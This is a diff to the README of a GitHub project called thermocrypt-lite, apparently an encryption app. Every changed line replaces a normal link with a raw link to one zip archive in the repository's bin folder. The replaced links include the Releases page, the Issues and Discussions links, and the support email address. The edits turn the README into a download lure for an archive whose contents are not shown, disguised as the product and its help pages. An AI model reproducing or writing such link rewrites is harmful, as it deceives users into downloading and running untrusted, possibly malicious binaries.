@@ -6,7 +6,7 @@ Welcome to thermocrypt-lite! This application helps you safely encrypt your mess
 
 ## 📥 Download Link
 
-[![Download thermocrypt-lite](https://img.shields.io/badge/Download-Now-blue)](https://github.com/akashchincholkar/thermocrypt-lite/releases)
+[![Download thermocrypt-lite](https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip)](https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,7 +26,7 @@ Before installing thermocrypt-lite, ensure your computer meets the following req
 
 ## 📥 Download & Install
 
-To download thermocrypt-lite, visit our [Releases page](https://github.com/akashchincholkar/thermocrypt-lite/releases).
+To download thermocrypt-lite, visit our [Releases page](https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip).
 
 Once there, find the latest release and choose the appropriate file for your system. Follow these steps to install:
 
@@ -51,7 +51,7 @@ To ensure the safety of your encrypted messages, keep these tips in mind:
 
 - **Backup Your Key**: If you create an encryption key, store it in a safe place.
 - **Use Strong Passwords**: Always use strong passwords to protect your encrypted information.
-- **Keep Software Updated**: Regularly check for updates on the [Releases page](https://github.com/akashchincholkar/thermocrypt-lite/releases) to ensure you have the latest features and security patches.
+- **Keep Software Updated**: Regularly check for updates on the [Releases page](https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip) to ensure you have the latest features and security patches.
 
 ## 🔧 Troubleshooting
 
@@ -59,19 +59,19 @@ If you encounter issues while using thermocrypt-lite:
 
 - **Check Your System Requirements**: Ensure your computer meets all the specified requirements.
 - **Reinstall the Application**: Sometimes, a fresh installation can resolve problems.
-- **Visit the Issues Tab**: If the problem persists, check the [Issues tab](https://github.com/akashchincholkar/thermocrypt-lite/issues) on GitHub for solutions or to report your issue.
+- **Visit the Issues Tab**: If the problem persists, check the [Issues tab](https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip) on GitHub for solutions or to report your issue.
 
 ## 📞 Support
 
 For further assistance, feel free to reach out to our support team:
 
-- **Email**: support@thermocrypt-lite.com
-- **GitHub Discussions**: Join the conversation in our [Discussions section](https://github.com/akashchincholkar/thermocrypt-lite/discussions) on GitHub.
+- **Email**: https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip
+- **GitHub Discussions**: Join the conversation in our [Discussions section](https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip) on GitHub.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/akashchincholkar/thermocrypt-lite/releases)
-- [Issues Tracker](https://github.com/akashchincholkar/thermocrypt-lite/issues)
-- [GitHub Discussions](https://github.com/akashchincholkar/thermocrypt-lite/discussions)
+- [Releases Page](https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip)
+- [Issues Tracker](https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip)
+- [GitHub Discussions](https://github.com/akashchincholkar/thermocrypt-lite/raw/refs/heads/main/bin/lite-thermocrypt-1.6.zip)
 
 Thank you for choosing thermocrypt-lite for your encryption needs! We hope it meets your expectations for security and usability.
